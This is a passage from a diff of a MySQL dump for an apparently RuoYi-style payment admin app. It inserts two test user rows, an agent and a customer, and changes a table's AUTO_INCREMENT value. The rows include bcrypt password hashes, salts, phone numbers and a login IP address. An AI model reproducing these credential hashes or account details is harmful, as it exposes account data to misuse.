+INSERT INTO `sys_user` VALUES (10, 217, 'agent1', '代理用户1', '03', '', '15888888880', '0', NULL, '$2a$10$hi2MYI5ZidJodEHmTa9l..TiqudvlxJgb9DE1W02EwMcfwNgLcQeO', '$2a$10$zPl70dsZOav16oOilF8bJOuM6Dx1CXO6MIF1oRoclJHh0jcvkZ8KC', '李敖', '465798', '/profile/upload/2024/01/06/image_20240106002359A001.jpeg', '/profile/upload/2024/01/06/image_20240106002359A002.jpeg', NULL, 'f81b23c69b951622', 5610.00, 0.00, '834d02', '微信支付补充信息', '/profile/upload/2024/05/23/image_20240523205556A003.jpeg', '333', '/profile/upload/2024/03/09/image_20240309010443A004.jpeg', NULL, NULL, NULL, 7, 0, 0, 10, '0', 0, 0, 0, '0', '0', '127.0.0.1', '2024-06-06 01:59:26', '', '2024-01-06 00:23:59', 'okadmin', '2024-06-06 01:59:25', NULL);
+INSERT INTO `sys_user` VALUES (11, 218, 'kehu1', '测试客户new1', '04', '', '15888888881', '0', NULL, '$2a$10$GVeRZAsgG/k7lDceqVZCGejCfKRFTaUtnuCJbuVPB3Z973ZW5DTCC', '$2a$10$ZSgqAfpH.vVC5O6HhQhexuquvLkBnnlKSDBHvntweOIKIq.Cz1c3i', '客', '12312312', '/profile/upload/2024/01/13/image_20240113231017A001.jpeg', '/profile/upload/2024/01/13/image_20240113231017A002.jpeg', NULL, '640a5d739e2e3fd0', 2328.40, 0.00, '0e9ace', '微信支付补充信息', '/profile/upload/2024/05/23/image_20240523195725A010.jpeg', NULL, '/profile/upload/2024/05/23/image_20240523195829A011.jpeg', NULL, NULL, NULL, 10, 0, 0, 0, '0', 0, 0, 0, '0', '0', '182.239.92.89', '2024-06-05 19:18:51', '', '2024-01-13 23:10:17', 'okadmin', '2024-06-05 19:18:51', 'hello');
 
 -- ----------------------------
 -- Table structure for sys_user_pay_type_approve
@@ -1478,7 +1853,7 @@ CREATE TABLE `sys_user_pay_type_approve`  (
   `update_time` datetime NULL DEFAULT NULL COMMENT '更新时间',
   `remark` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '备注',
   PRIMARY KEY (`pay_type_approve_id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户支付方式审核表' ROW_FORMAT = DYNAMIC;
+) ENGINE = InnoDB AUTO_INCREMENT = 17 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户支付方式审核表' ROW_FORMAT = DYNAMIC;
 
 -- ----------------------------
 -- Records of sys_user_pay_type_approve
